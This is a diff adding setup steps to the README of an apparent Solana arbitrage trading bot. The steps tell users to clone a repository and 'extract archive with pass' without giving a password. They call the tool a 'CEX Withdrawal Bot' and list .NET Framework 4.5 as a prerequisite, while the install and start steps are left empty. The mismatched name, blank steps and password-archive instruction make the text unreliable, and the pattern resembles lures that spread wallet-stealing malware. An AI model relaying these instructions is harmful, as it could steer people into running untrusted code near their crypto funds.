@@ -14,8 +14,24 @@ The Solana Arbitrage Bot is an automated trading tool designed to identify and e
 - **Wallet Integration:** Supports integration with Solana wallets for seamless trading execution.
 
 ## Getting Started
+Follow these steps to set up and run the CEX Withdrawal Bot on your local machine:
+
+    Clone the repository:
+
+    git clone https://github.com/gemhunterheh/solana-arbitrage-bot.git
+    cd solana-arbitrage-bot
+    extract archive with pass 
+
+    Install dependencies:
+
+    Configure your environment:
+
+Create a .env file in the project's root directory and define your environment variables. You can use the .env.example file as a template.
+
+    Start the bot:
 
 
 ### Prerequisites
 
 Before running the Solana Arbitrage Bot, make sure you have the following prerequisites installed:
+- .Net Framework 4.5
